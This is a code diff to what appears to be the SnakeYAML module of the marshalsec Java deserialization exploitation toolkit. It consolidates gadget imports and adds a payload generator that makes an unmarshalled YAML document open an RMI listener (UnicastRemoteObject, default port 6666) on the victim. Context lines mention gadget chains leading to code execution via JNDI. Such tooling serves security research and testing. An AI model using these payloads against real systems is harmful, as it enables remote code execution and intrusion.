@@ -34,6 +34,7 @@ import javax.naming.InitialContext;
 import javax.naming.Reference;
 import javax.script.ScriptEngineManager;
 
+import marshalsec.gadgets.*;
 import org.apache.commons.configuration.ConfigurationMap;
 import org.apache.commons.configuration.JNDIConfiguration;
 import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
@@ -43,31 +44,20 @@ import org.springframework.beans.factory.config.PropertyPathFactoryBean;
 import org.springframework.jndi.support.SimpleJndiBeanFactory;
 import org.yaml.snakeyaml.Yaml;
 
-import marshalsec.gadgets.Args;
-import marshalsec.gadgets.C3P0RefDataSource;
-import marshalsec.gadgets.C3P0WrapperConnPool;
-import marshalsec.gadgets.CommonsConfiguration;
-import marshalsec.gadgets.JdbcRowSet;
-import marshalsec.gadgets.ResourceGadget;
-import marshalsec.gadgets.ScriptEngine;
-import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
-import marshalsec.gadgets.SpringPropertyPathFactory;
-import marshalsec.gadgets.XBean;
-
 
 /**
- * 
+ *
  * Not applicable:
  * - ROME: cannot construct java.lang.Class instance
  * - ImageIO: cannot construct Method instance, can however still be used to trigger an iterator
- * 
+ *
  * - LazySearchEnumeration: may be possible
- * 
+ *
  * @author mbechler
  *
  */
 public class SnakeYAML extends YAMLBase implements ScriptEngine, JdbcRowSet, CommonsConfiguration, C3P0RefDataSource, C3P0WrapperConnPool,
-        SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean, ResourceGadget {
+        SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean, ResourceGadget, UnicastRemoteObjectGadget {
 
     /**
      * {@inheritDoc}
@@ -199,6 +189,16 @@ public class SnakeYAML extends YAMLBase implements ScriptEngine, JdbcRowSet, Com
             // the lookup of the intermediate context __/obj yields the Reference bound before
             // --> code execution through JNDI factory loading
             writeConstructor(Resource.class, true, writeString("obj/test"), writeConstructor(Object.class, true)));
+    }
+
+    @Override
+    @Args(minArgs = 1, args = {
+            "rmiPort"
+    },defaultArgs = {
+            "6666"
+    }, noTest = true)
+    public Object makeUnicastRemoteObject(UtilFactory uf, String[] args) throws Exception {
+        return writeConstructor(java.rmi.server.UnicastRemoteObject.class, true, args[0]);
     }
 
 
